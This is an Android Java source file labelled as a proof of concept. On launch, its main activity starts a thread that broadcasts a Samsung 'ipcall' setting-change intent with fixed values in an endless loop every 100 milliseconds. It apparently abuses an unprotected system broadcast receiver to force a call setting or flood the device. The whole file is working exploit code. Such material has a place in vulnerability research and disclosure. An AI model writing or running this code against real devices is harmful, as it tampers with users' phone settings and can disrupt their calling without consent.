package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        new Thread(() -> {
            Intent i = new Intent("com.sec.commands.ipcall.action_ip_setting_change");
            i.putExtra("com.sec.commands.ipcall.setting", 2);
            i.putExtra("com.sec.commands.ipcall.state", 1);
            while (true) {
                sendBroadcast(i);
                try {
                    Thread.sleep(100);
                } catch (Throwable th) {
                    throw new RuntimeException(th);
                }
            }
        }).start();
    }
}